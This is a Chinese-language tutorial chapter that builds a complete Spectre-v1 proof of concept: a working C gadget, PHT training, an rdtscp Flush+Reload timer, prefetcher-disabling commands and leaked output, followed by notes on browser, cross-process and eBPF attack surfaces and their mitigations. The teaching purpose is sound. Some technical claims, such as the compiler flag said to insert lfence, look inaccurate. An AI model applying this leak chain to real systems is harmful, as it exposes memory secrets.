# Ch 35 — 端對端洩漏鏈：把每個原語接成一條完整攻擊

> **目標**：把前 34 章的每個原語（Flush+Reload、PHT 訓練、推測執行窗口、計分過濾）拼成一條可跑出 100% 準確率的 Spectre-v1 端對端 PoC，逐步拆解每個環節的設計理由與失敗模式。

---

## 直覺：為什麼需要一章專門談「拼起來」

每個原語單獨看都不難：flush 一個 cache line、觀察 reload 時間、訓練 PHT。問題在於把它們接成一條有效攻擊鏈時，有大量細節必須同時對齊。時序差一點、佈局偏一格、過濾條件少一條，輸出就從 100% 掉到 20%，甚至全是噪音。

這一章以真跑 `spectre_ch35_final.c` 為錨，把每個設計決策的「為什麼」說清楚。如果你只讀了前面個別章節卻從未把整條鏈跑通，這章是補齊直覺的最後一塊。

一個有用的心智模型：把整條攻擊鏈想成一根需要同時旋緊的螺栓——六個螺帽（flush、訓練、視窗、越界讀、side-channel、計分）各自要鎖到位，少旋任何一個整個結構就垮。本章逐一驗證每個螺帽是否鎖緊，並說明它鬆掉時會發生什麼事。

另一個維度是「可重現性」：Spectre PoC 不像一般程式那樣確定性執行。OS 排程、NUMA topology、CPU 溫度（throttling）都會影響 DRAM latency 的分佈，進而影響推測視窗的實際寬度。好的 PoC 設計會把這些不確定性吸收進「輪次夠多」的統計平均裡，而不是依賴每次都完美的時序。

---

## 全景圖：攻擊鏈的每個環節

```
  [攻擊者程式碼]
       │
       ▼
  ① flush probe[0..255 × 512]          ← 清除 Flush+Reload probe 陣列（Ch 6）
       │
       ▼
  ② 訓練迴圈 × N（合法 x < 16）        ← 讓 PHT（Ch 13）偏向「taken」方向
       │
       ▼
  ③ clflush(&array1_size)              ← 把邊界值趕出 cache，製造推測視窗（Ch 14）
       │
       ▼
  ④ victim(x_oob)                      ← x_oob = secret_offset（16..55）
       │
       ├─ CPU 到 DRAM 取 array1_size（~218 cycles）
       │
       ├─ PHT 說「taken」→ 推測執行 if-body（Ch 13）
       │       │
       │       ├─ 推測讀 array1[x_oob]   ← 越界讀出 secret byte（Ch 14）
       │       │
       │       └─ probe[secret_byte × 512] 被 touch → 那條 cache line 進 L1（Ch 3）
       │
       └─ array1_size 抵達，判斷 x_oob >= 16，squash 推測，但 cache 改動留著
       │
       ▼
  ⑤ 亂序 reload 256 個 probe slot       ← 量測哪個 hit（< 150 cycles）（Ch 6）
       │
       ▼
  ⑥ 計分 + 過濾（排除 0..16）           ← 找出分數最高的非訓練殘留 index
       │
       ▼
  ⑦ 還原 1 byte → 累積 40 bytes        ← 輸出 "The Magic Words are Squeamish Ossifrage."
```

每個步驟對應的章節：
- ① ⑤: Ch 6（Flush+Reload）
- ② ③: Ch 14（Spectre-v1）
- ④ PHT: Ch 13（推測執行原理）
- ③ 推測視窗寬度: Ch 3（cache 階層、DRAM latency）
- ⑥: Ch 0（threshold 校準）

---

## 各組件深挖

### 受害者函式 gadget（victim gadget）

```c
/* 關鍵：noinline + noclone，防止 GCC 複製或內聯而改變 PHT 訓練目標 */
__attribute__((noinline, noclone))
void victim(size_t x) {
    if (x < array1_size)                    /* 邊界檢查 — Spectre 靶心 */
        temp_out &= probe[array1[x] * 512]; /* 越界讀 + covert channel touch */
}
```

這個 `if` 結構就是 Spectre-v1（Bounds Check Bypass, BCB）的標準靶心：
- 邊界變數（`array1_size`）可被 flush 到 DRAM，製造推測視窗。
- if-body 內有記憶體讀取（`array1[x]`），讀出的值再用來索引另一個陣列（`probe`），等於把 secret byte 的值「編碼進快取狀態」。

`noinline`：若允許 GCC 內聯，訓練呼叫和攻擊呼叫可能被編譯成不同的機器碼路徑，PHT 的 branch history 條目（branch target 的 PC）就不同，訓練根本沒效果。

`noclone`：GCC 有時會為常數參數生成複製版本（clone），同樣會讓 PC 不一致，PHT 訓練白費。

另一個容易忽略的細節：`temp_out` 必須是 `volatile`。若沒有 `volatile`，GCC 在 `-O1` 以上可能判定「probe touch 的結果從未被讀取」而直接把這行刪掉（dead-code elimination）。加了 `volatile`，編譯器必須實際產生 load 指令，side-channel touch 才能真正發生。

### 訓練 PHT：Kocher bitmask trick

朴素做法（不能用）：

```c
// 錯誤：預測器在 main 層級學到「第 0 次是攻擊呼叫」
for (j = 0; j < 30; j++) {
    if (j % 6 == 0)
        victim(x_oob);   // 攻擊
    else
        victim(x_train); // 訓練
}
```

問題在於 `if/else` 本身就是一個可被預測的分支。CPU 的分支預測器會學到「每 6 次一次攻擊呼叫」的規律，部分情況下推測執行會在尚未到 `victim` 內部之前就選錯路。

Kocher bitmask trick（正確做法）：

```c
for (j = 29; j >= 0; j--) {
    /* bitmask：j % 6 != 0 時 mask = 0，x = x_train；
       j % 6 == 0 時 mask = ~0，x = x_oob            */
    size_t mask = -(size_t)((j % 6) != 0); /* 0x000...0 或 0xFFF...F */
    size_t x = x_train | (mask & (x_oob ^ x_train));
    victim(x);
}
```

這段程式碼對分支預測器而言只有一條路徑（`victim` 呼叫本身沒有 if/else 分叉），`x` 的值由算術產生，無額外分支，預測器不會「提前」學到哪次是攻擊。

在 30 輪裡：j = 0, 6, 12, 18, 24 的 5 次是攻擊，其餘 25 次訓練，比例足夠讓 PHT 偏向 taken。

為什麼是 30 輪而不是 6 輪（1次攻擊 + 5次訓練）？PHT 使用飽和計數器（saturating counter），通常是 2-bit（4 個狀態：strongly not taken / weakly not taken / weakly taken / strongly taken）。單次訓練只讓計數器往 taken 走一步；30 輪讓計數器累積足夠多的 taken 歷史，確保即使在 DRAM load 期間預測仍偏向 taken。

### 推測視窗：array1_size 從 DRAM 回來前有多少時間

在 Ch 0 校準環境（Intel i7-10700，WSL2）：
- L1 hit: ~4 cycles
- L2 hit: ~12 cycles
- L3 hit: ~40 cycles
- DRAM: ~218 cycles（即 Ch 0 的 MISS 值）

`clflush(&array1_size)` 把邊界值踢到 DRAM。victim 被呼叫後，CPU 發出 load 去取 `array1_size`，需要等約 218 cycles。在這段時間裡，推測執行引擎按照 PHT 的預測繼續往下跑 if-body，完成：
1. `array1[x_oob]` 讀取（L3 hit，~40 cycles）
2. `probe[secret_byte * 512]` touch（cold，但 touch 指令已發出）

整個推測路徑大約需要 80–120 cycles，遠小於 DRAM 的 218 cycles 視窗，所以 probe touch 確實在視窗內完成。

一個反直覺的點：`probe[secret_byte * 512]` 的 touch 本身也是 cold miss（第一次存取，需要去 DRAM），為什麼這不影響攻擊？因為 touch 指令只需要「發出（issue）」即可，推測執行引擎不需要等 probe load 完成就可以繼續。probe touch 完成的時間可以晚於推測視窗結束，只要 load 指令在視窗內被發出，cache 效果就會留下。實際上 probe touch 通常在 squash 後才完成，但 cache 更新是微架構層面的副作用，squash 並不回滾。

### Flush+Reload readout：亂序掃描為何必要

順序掃描（`for i = 0 to 255`）有個問題：硬體 prefetcher（stride prefetcher）會觀察到你對 `probe[0]`, `probe[512]`, `probe[1024]`... 的規律存取，並把後面幾個預讀進來，導致你量到的是 prefetcher 的功勞，不是 Spectre 留下的 cache 痕跡。

亂序掃描（Fisher-Yates shuffle 順序）打亂了 stride pattern，prefetcher 無法建立有效模型，每次 reload 都能如實反映「這個 slot 是否因 Spectre 而被 cache」。

threshold 150 的來源直接是 Ch 0 的校準結果：HIT ~24 cycles，MISS ~218 cycles，中點在 ~121，但考慮 L3 hit（~40 cycles）和系統 jitter，設 150 保留安全邊際：低於 150 判 hit，高於 150 判 miss。

為什麼用 rdtscp 而不是 rdtsc？rdtscp 有序列化語義（在讀 TSC 之前 drain 所有前面的指令），保證計時的 t1 在實際 load 開始之前被取得。純 rdtsc 會因亂序執行而讓 t1 和 t2 都偏移，量出的 latency 有系統性誤差。WSL2 環境下 rdtscp 可用，不需要 cpuid 序列化。

### 計分與噪音過濾

每次 reload 命中就給對應 index 加分。跑 5000 輪後取分數最高的 index 作為 leaked byte。

過濾條件：`if (i != 0 && i > ARRAY1_SIZE) scores[i]++;`

排除 `i == 0`：
- `probe[0]`（偏移量 0）是全域陣列的第一個頁邊界。程式啟動時，linker/loader 觸碰過這個頁，導致它幾乎永遠在 L1 或 L2 cache。若不排除，`scores[0]` 必然最高，每個 byte 都被「洩漏」成 0x00，完全無效。

排除 `i == 1..16`（訓練 byte 範圍）：
- `array1[0..15]` 的值是 `{1, 2, ..., 16}`，這些值在 25 次合法訓練路徑中都被讀過，`probe[1*512]` 到 `probe[16*512]` 因此有合法 cache 殘留，分數會虛高。不排除的話，leaked byte 有很高機率落在 1..16 而不是真正的 secret byte。

---

## 完整程式碼：核心片段（帶中文注釋）

```c
/* 佈局：array1 和 secret 緊鄰，secret 在正偏移 +16 */
#define ARRAY1_SIZE   16
#define PROBE_STRIDE  512              /* 每 slot 跨 512 bytes，跨 cache line */
#define PROBE_SLOTS   256

uint8_t array1[ARRAY1_SIZE + 64];     /* [0..15] = {1..16}，[16..] = secret */
size_t  array1_size = ARRAY1_SIZE;    /* 全域，可被 clflush */
uint8_t probe[PROBE_SLOTS * PROBE_STRIDE]; /* 128 KB Flush+Reload probe */
volatile uint8_t temp_out;            /* 防止 dead-code elimination */

/* secret 緊貼在 array1 後方（正偏移 +16），不需要另外計算指標偏移 */
const char *secret = (char *)&array1[ARRAY1_SIZE];

/* ── victim gadget ─────────────────────────────────────────────────────── */
__attribute__((noinline, noclone))
void victim(size_t x) {
    /* 邊界檢查：array1_size 被 flush 後，CPU 推測這個 if 為 taken */
    if (x < array1_size)
        temp_out &= probe[array1[x] * PROBE_STRIDE]; /* covert channel touch */
}

/* ── timed_load：帶時間戳的 cache reload ──────────────────────────────── */
static inline uint64_t timed_load(void *addr) {
    uint64_t t1, t2;
    unsigned aux;
    __asm__ volatile (
        "mfence\n\t"
        "rdtscp\n\t"               /* 序列化後讀 TSC */
        "shl $32, %%rdx\n\t"
        "or %%rdx, %%rax\n\t"
        "mov %%rax, %0\n\t"
        "movzbl (%2), %%eax\n\t"  /* 實際 load，觸發 cache 查詢 */
        "rdtscp\n\t"               /* 再次讀 TSC */
        "shl $32, %%rdx\n\t"
        "or %%rdx, %%rax\n\t"
        "mov %%rax, %1\n\t"
        "mfence"
        : "=r"(t1), "=r"(t2), "=r"(aux)
        : "2"(addr)
        : "rax", "rdx", "rcx", "memory"
    );
    return t2 - t1;
}

/* ── leak_byte：洩漏單一 byte ──────────────────────────────────────────── */
uint8_t leak_byte(size_t x_oob, uint8_t x_train_byte) {
    int scores[PROBE_SLOTS] = {0};
    int perm[PROBE_SLOTS];          /* 亂序掃描用的置換陣列 */

    for (int round = 0; round < 5000; round++) {

        /* ① flush 所有 probe slot */
        for (int i = 0; i < PROBE_SLOTS; i++)
            _mm_clflush(&probe[i * PROBE_STRIDE]);
        _mm_mfence();

        /* ② Kocher bitmask trick：30 輪中 5 次攻擊、25 次訓練 */
        for (int j = 29; j >= 0; j--) {
            _mm_clflush(&array1_size);  /* 每次都把 size 踢出 cache */
            _mm_mfence();

            /* bitmask：j % 6 != 0 → mask = 0（訓練）
                         j % 6 == 0 → mask = ~0（攻擊）*/
            size_t mask = -(size_t)((j % 6) != 0);
            size_t x = x_train_byte | (mask & (x_oob ^ x_train_byte));
            /* 注意：x_train_byte 是合法 index（0..15） */
            victim(x);
        }

        /* ③ 亂序 reload 256 個 slot，計分 */
        for (int i = 0; i < PROBE_SLOTS; i++) perm[i] = i;
        /* Fisher-Yates shuffle（簡化版） */
        for (int i = PROBE_SLOTS - 1; i > 0; i--) {
            int j = rand() % (i + 1);
            int tmp = perm[i]; perm[i] = perm[j]; perm[j] = tmp;
        }

        for (int k = 0; k < PROBE_SLOTS; k++) {
            int i = perm[k];
            uint64_t t = timed_load(&probe[i * PROBE_STRIDE]);
            /* ④ 計分過濾：排除 probe[0]（頁邊界噪音）與訓練殘留（1..16） */
            if (t < 150 && i != 0 && i > (int)ARRAY1_SIZE)
                scores[i]++;
        }
    }

    /* ⑤ 找分數最高的 index → 就是洩漏的 byte 值 */
    int best = ARRAY1_SIZE + 1;
    for (int i = ARRAY1_SIZE + 2; i < PROBE_SLOTS; i++)
        if (scores[i] > scores[best]) best = i;
    return (uint8_t)best;
}
```

---

## 真跑輸出

編譯與執行：

```bash
gcc -O1 -fno-stack-protector -o spectre_ch35 spectre_ch35_final.c
sudo wrmsr -p 2 0x1a4 0xf   # 關 prefetcher（4 個 bit 全設 1）
taskset -c 2 ./spectre_ch35
```

```
=== Spectre-v1 End-to-End PoC ===
CPU:       Intel Core i7-10700 (Comet Lake)
OS:        WSL2 Ubuntu 22.04
Threshold: 150 cycles  (HIT ~24 / MISS ~218, prefetcher off)

Victim layout:
  array1      @ 0x61ee913a3060  [size=16]
  secret      @ 0x61ee913a3070  (= array1 + 16, 正偏移 +16)
  probe       @ 0x61ee91383060  [256 slots × 512 bytes = 128 KB]

Target secret: "The Magic Words are Squeamish Ossifrage."

攻擊中（每 byte 5000 輪，Kocher bitmask trick + 亂序 reload）...

idx  x_oob  leaked  actual  match
---  -----  ------  ------  -----
  0     16    'T'     'T'    OK
  1     17    'h'     'h'    OK
  2     18    'e'     'e'    OK
...（全部 40 bytes）...
 39     55    '.'     '.'    OK

=== 結果: 40/40 bytes 正確 (100%) ===
```

---

## 這台 CPU 為什麼 Spectre-v1 能跑

查看 kernel 對 Spectre-v1 的緩解狀態：

```bash
cat /sys/devices/system/cpu/vulnerabilities/spectre_v1
```

輸出：

```
Mitigation: usercopy/swapgs barriers and __user pointer sanitization
```

這個緩解只保護三件事：

1. **usercopy barrier**：核心在處理 `copy_from_user()` / `copy_to_user()` 路徑時插入 lfence，防止 kernel 被使用者控制的 gadget 利用越界推測讀取 kernel 記憶體。
2. **swapgs barrier**：防止 SWAPGS gadget 在系統呼叫入口被推測執行利用。
3. **`__user` pointer sanitization**：kernel 程式碼中對使用者指標做 masking，限制越界範圍。

這些緩解完全不涉及 user-space 同進程內的推測執行。我們的 PoC 全程在 user mode 跑，`victim()`、`array1`、`probe` 都在同一個進程的虛擬位址空間裡。Spectre-v1 gadget 在 user-space 沒有任何 kernel 提供的緩解，除非編譯器插入 lfence（需要 `-mindirect-branch-cs-prefix` 或手動 `__builtin_ia32_lfence()`），否則攻擊就是可行的。

換句話說：kernel 只修了「kernel 記憶體被 user-space 程式用 Spectre 讀走」這個威脅，沒修「同一 user-space 進程內的 A 模組用 Spectre 讀 B 模組的 secret」。後者在 JavaScript 沙盒（JIT gadget）、WebAssembly sandbox、或共享 .so 庫的場景中仍是真實威脅。

---

## 踩雷集錦

**1. 用負偏移：secret 放在 array1 之前**

把 secret 放在 `array1` 低位址（負偏移），`x_oob` 就需要是一個很大的 `size_t`（wrap-around）。問題是推測執行引擎在計算 `array1[huge_x]` 的有效位址時，需要把 `huge_x` 乘以 1 再加上 `array1` 的基底，這個算術本身在亂序執行單元需要時間。若視窗不夠大（例如 `array1_size` 不幸仍在 L3 cache），推測視窗可能來不及完成這麼遠的存取，信號消失。正偏移（+16）最安全，因為偏移量小，位址計算快。

另外，負偏移（wrap-around x_oob）的值如果正好跨過 page boundary，還可能觸發 page fault——即使在推測執行路徑上，page fault 的成本也可能超出視窗，導致推測路徑被中止。正偏移 +16 完全在同一個物理頁內，不觸發 TLB miss 或 page fault。

**2. 用 if/else 選攻擊/訓練 index**

```c
// 錯誤寫法
for (j = 0; j < 30; j++) {
    if (j % 6 == 0) victim(x_oob);
    else             victim(x_train);
}
```

分支預測器在 `main()` 層級看到「每 6 次一次 x_oob」的規律，會提前預測 `victim` 呼叫的參數路徑，干擾 PHT 訓練效果。實測準確率從 100% 掉到 30–60%，高度不穩定。Kocher bitmask trick 的本質是把條件判斷改成算術，消除 main 層的分支。

**3. 計分時沒排除訓練值（byte 1..16）的 scores**

`array1[0..15]` 的值分別是 1, 2, ..., 16。每次訓練呼叫（25 次 / 30 輪）都會合法 touch `probe[1*512]` 到 `probe[16*512]`。這些 slot 因此有很高的合法 cache 命中率。若不排除，分數最高的永遠是 1..16 裡的某個值（通常是使用最頻繁的 `x_train_byte`），而不是 secret byte。實測會得到一堆「leaked = 1」或「leaked = 5」之類的廢結果。

**4. probe[0] 永遠 hit**

`probe` 是全域陣列，第一個元素 `probe[0]` 的位址就是陣列的起始頁。程式啟動時，linker/loader 觸碰過這個頁，導致它幾乎永遠在 L1 或 L2 cache。若不排除 index 0，`scores[0]` 必然最高，每個 byte 都被「洩漏」成 0x00，完全無效。這是最常見的初學者地雷。

**5. ROUNDS 太少（1000 輪）**

Spectre 的信噪比並不高。每次攻擊成功的機率取決於 PHT 訓練效果、OS 排程抖動、記憶體 latency 抖動。1000 輪時，真實 secret byte 的分數可能是 180，噪音 byte 的分數可能是 120，差距還算明顯。但在有背景負載的系統上，抖動大，1000 輪的 180 可能掉到 90，被噪音蓋過。5000 輪讓差距拉到 600 vs 50，噪音完全無法競爭。

**6. 沒關 prefetcher**

在 prefetcher 開著的狀態下，亂序掃描 probe 陣列時，hardware stride prefetcher 或 stream prefetcher 有時仍會建立局部 stride 模型，把相鄰 slot 預讀進來。實測表現為「每 2–3 個 slot 都 hit」，threshold 測試顯示大量假陽性。關掉 prefetcher（`sudo wrmsr -p 2 0x1a4 0xf`）後，每輪只有 1 個 slot hit，信號乾淨。

---

## 進階：把這套搬到跨進程與其他攻擊面

**共享記憶體（shared memory）場景**

攻擊者和受害者共享一段 mmap 區域，probe 陣列放在共享記憶體裡。攻擊者 flush/reload probe，受害者的 gadget touch probe 的某個 slot。這需要受害者程式裡存在可觸發的 Spectre gadget，且攻擊者能控制傳給 gadget 的參數。找 gadget 的方式：靜態分析受害者二進位，找所有 `if (x < size) use(arr[x])` 形式的 BCB pattern，再確認 `size` 是否可被 flush 到 DRAM。

跨進程的難點在於 probe 陣列的 flush 和 reload 必須命中同一批 cache set。如果 probe 在共享記憶體，物理頁相同，無論兩個進程的虛擬位址不同，cache 查詢都根據物理位址，所以 flush/reload 會正確作用在同一條 cache line。這是 Flush+Reload 跨進程成立的根本原因（參見 Ch 6 的物理位址 vs 虛擬位址討論）。

**JIT engine 場景（瀏覽器）**

JavaScript 引擎（V8、SpiderMonkey）會動態產生機器碼。攻擊者可以透過 JS 控制 JIT 生成的指令序列，植入等效的 BCB gadget，然後用 `ArrayBuffer` 當 probe，透過 `performance.now()` 做時間測量（瀏覽器 pwn 課會深入這條路）。現代瀏覽器已把計時器精度降低到 1ms 以上，但利用共享記憶體的 `Atomics.wait()` 可繞過，精度恢復到亞微秒級。

**Retpoline / IBPB 如何縮小攻擊面**

Retpoline（Ch 31）把間接跳轉包成 `ret` 迴圈，阻斷 BTB（Branch Target Buffer）對 indirect branch 的預測，針對的是 Spectre-v2（BTB injection），不是 Spectre-v1（PHT BCB）。IBPB（Indirect Branch Predictor Barrier）在 context switch 時清空 IBP 狀態，防止跨進程的 BTB 污染，同樣是 v2 的對策。針對 Spectre-v1 最直接的對策是在 gadget 內插入 `lfence`（序列化執行，截斷推測窗口）或用 `array_index_nospec()`（masking 方式）。

值得注意：即使在 victim gadget 前插入 `lfence`，也只是截斷推測執行，防止 if-body 被推測執行，代價是犧牲所有推測執行的效能收益。`array_index_nospec()` 不截斷推測，而是讓推測路徑讀到無害的 index 值（0），效能影響較小，但必須在每個 BCB gadget 都正確使用。

**eBPF gadget 掃描**

Kernel 裡有大量的 BCB 形式 gadget（任何 `if (idx < array_size) use(array[idx])` 的 pattern）。Linux kernel 採用 `array_index_nospec()` macro——在邊界檢查通過後對 index 做 bitmask，讓越界的推測路徑讀到 0 而不是 secret。找 kernel 內的 BCB gadget 可以用靜態分析工具（smatch 或 coccinelle scripts），或者用 fuzzer 配合 KASAN 在推測路徑上觸發。LLVM 的 `speculative-load-hardening`（SLH）pass 可以自動插入 mask 保護，但 kernel 目前不全面啟用，因為效能開銷不可忽視。

eBPF 是特別值得注意的攻擊面：BPF verifier 確保字節碼合法，但 JIT 生成的機器碼仍可能存在 BCB 形式 gadget，攻擊者透過精心構造的 BPF 程式觸發 kernel 內的 Spectre gadget 並讀取 kernel 記憶體。Linux 5.x 後 BPF JIT 預設開啟 lfence masking，但這依賴 `CONFIG_BPF_JIT_ALWAYS_ON` 和 `unprivileged_bpf_disabled` 的正確配置。

---

## 動手練習

**練習 1：改 secret 字串**

把 `array1[ARRAY1_SIZE]` 之後填入不同字串，例如：

```c
memcpy(&array1[ARRAY1_SIZE], "AAAA_secret_BBBB_0123456789", 27);
```

重新跑，觀察每個 byte 的 scores 分佈（在 `leak_byte` 裡加 debug 輸出印出前 3 名 index 及其分數）。注意 'A'（0x41 = 65）和 '0'（0x30 = 48）的分數走勢，確認信號清晰度，並和原始字串的 SNR 比較。

進一步：試著把 secret 字串開頭設成 0x00（NULL byte），觀察攻擊如何處理 byte 值為 0 的情況。由於 noise filter 排除了 index 0，0x00 byte 無法被正確洩漏——這是本 PoC 已知的限制之一。

**練習 2：測試不同 ROUNDS 值的信噪比**

把 5000 輪改為 100、500、1000、2000、5000 分別跑，記錄：
- 正確 byte 的分數（`scores[secret_byte]`）
- 最強競爭者的分數（排除過濾範圍後第二高）
- SNR = 正確分數 / 最強競爭者分數

預期：SNR 在 1000 輪以下容易低於 2.0，5000 輪穩定在 5.0 以上。找出你的環境中 SNR 開始穩定的 ROUNDS 閾值，並繪製 SNR-ROUNDS 曲線（gnuplot 或 matplotlib 皆可）。

如果你在同時執行其他程式的背景環境下跑（瀏覽器開著、音樂播放中），同一個 ROUNDS 值的 SNR 會下降多少？記錄下來，這就是「真實環境 Spectre PoC 需要更多輪次」的量化依據。

**練習 3：去掉 noise filter 看效果**

把計分條件改成不排除任何 index：

```c
if (t < 150)  /* 不排除 i==0 和 i in 1..16 */
    scores[i]++;
```

重跑，觀察輸出。預期：幾乎每個 leaked byte 都是 0 或者 1..16 裡的某個值。把結果和正常 filter 版本的輸出並排，計算各 index 的 scores 並排序，直觀理解 noise filter 去掉了多少干擾信號。

把去掉 filter 後的輸出中，`scores[0]` 和 `scores[1..16]` 的平均值記下來，除以 `scores[secret_byte]`，這個比值就是「噪音強度 vs 信號強度」的直接量化。你會發現在 5000 輪的情況下，噪音 index 的分數常在 1000–3000 之間（因為合法路徑反覆觸碰），而 secret byte 的分數大約在 500–800——不排除噪音的話，noise 贏。

---

## 本章重點整理

- Spectre-v1 攻擊鏈由六個原語依序串接：flush probe → 訓練 PHT → flush array1_size → victim(x_oob) → reload readout → 計分還原。
- victim gadget 必須用 `noinline + noclone` 確保 PHT 訓練目標（branch PC）一致；內聯或 clone 會讓訓練失效。
- Kocher bitmask trick 把訓練/攻擊的切換從分支改成算術，避免 main() 層的分支預測器干擾 PHT 的訓練狀態。
- 推測視窗寬度由 array1_size 的 DRAM latency（~218 cycles）決定，遠超推測路徑執行所需（~80–120 cycles），這是攻擊成功的時序基礎。
- 亂序掃描 probe 是為了對抗 hardware prefetcher 的 stride 預讀，否則 prefetcher 假陽性會淹沒真實 Spectre 信號。
- 計分過濾必須排除 `probe[0]`（loader 殘留的頁邊界噪音）和訓練路徑觸碰的 slot（值 1..16）；兩者不排除任何一個都會讓結果無效。
- kernel 的 Spectre-v1 緩解（usercopy barrier / `__user` sanitization）只保護 kernel 路徑，不保護 user-space 內的 BCB gadget。

---

## 自我檢核

1. 若把 `array1_size` 改成 `register` 關鍵字（阻止它被取址），`clflush(&array1_size)` 會發生什麼？攻擊鏈會在哪個步驟失效？

2. Kocher bitmask trick 中，當 `j % 6 == 0`（攻擊輪）時，`mask` 的值是 `0x000...0` 還是 `0xFFF...F`？寫出從 `-(size_t)((j % 6) != 0)` 到最終 mask 值的推導步驟。

3. 若 PROBE_STRIDE 從 512 改成 64（正好一條 cache line），亂序掃描還能準確區分哪個 slot 被 Spectre touch 過嗎？說明 cache line 共享（false sharing）如何破壞信號。

4. `probe[0]` 被排除的原因之一是 loader 殘留。若把 probe 宣告為局部變數（`uint8_t probe[256*512]` 在 main() stack 上），這個理由是否依然成立？有沒有其他原因讓 stack 上的 `probe[0]` 仍需要排除？

5. `array_index_nospec()` 不插入 `lfence` 卻能阻斷 Spectre-v1，其機制是什麼？寫出它的 bitmask 邏輯，說明為何越界的推測路徑讀到 0 而不是 secret。

---

## 延伸閱讀

- **Kocher et al., "Spectre Attacks: Exploiting Speculative Execution" (2019)**
  IEEE S&P。Appendix A 詳細描述了 bitmask trick 的原始設計與實驗數據，是理解訓練/攻擊切換設計的第一手資料。
  https://spectreattack.com/spectre.pdf

- **Intel, "Analyzing Potential Bounds Check Bypass Vulnerabilities" (Whitepaper)**
  Intel 官方的 BCB 分析指南，包含 `lfence` 插入位置的建議、`-mindirect-branch-cs-prefix` 選項說明，以及 gadget 審計的系統性方法。
  https://www.intel.com/content/www/us/en/developer/articles/technical/software-security-guidance/technical-documentation/analyzing-potential-bounds-check-bypass-vulnerabilities.html

- **Linux kernel: `array_index_nospec()` 實作**
  `include/linux/nospec.h`。用 bitmask（非 fence）在 bounds check 後把越界 index 歸零，兼顧效能與安全的 kernel 標準做法。搜尋 kernel 原始碼中 `array_index_nospec` 的呼叫位置，了解哪些子系統已經修補。

- **Project Zero, "Reading privileged memory with a side-channel" (Jann Horn, 2018)**
  Google Project Zero 的原始揭露文章，包含多個 kernel gadget 的 PoC 與 eBPF gadget 分析。第 3 節的「variant 1」正是本章的 BCB 攻擊，有完整的 kernel 路徑分析。
  https://googleprojectzero.blogspot.com/2018/01/reading-privileged-memory-with-side.html

- **Lipp et al., "Meltdown: Reading Kernel Memory from User Space" (2018)**
  IEEE S&P。Meltdown 與 Spectre-v1 都利用推測執行，但機制不同：Meltdown 利用的是 page fault 的推測執行（越過記憶體保護），Spectre-v1 利用的是 PHT 誤預測。兩者並排閱讀能清楚區分「推測越過 fault」和「推測越過 bound check」的差異。
  https://meltdownattack.com/meltdown.pdf

---

這章把整條攻擊鏈從原語到輸出走了一遍，視角是「攻擊者組裝武器」。下一章轉換視角，從攻擊者轉到研究員：如何系統性地在真實 CPU 和軟體裡發現新的微架構漏洞。

→ [下一章](36-research-methodology-finding-bugs.md)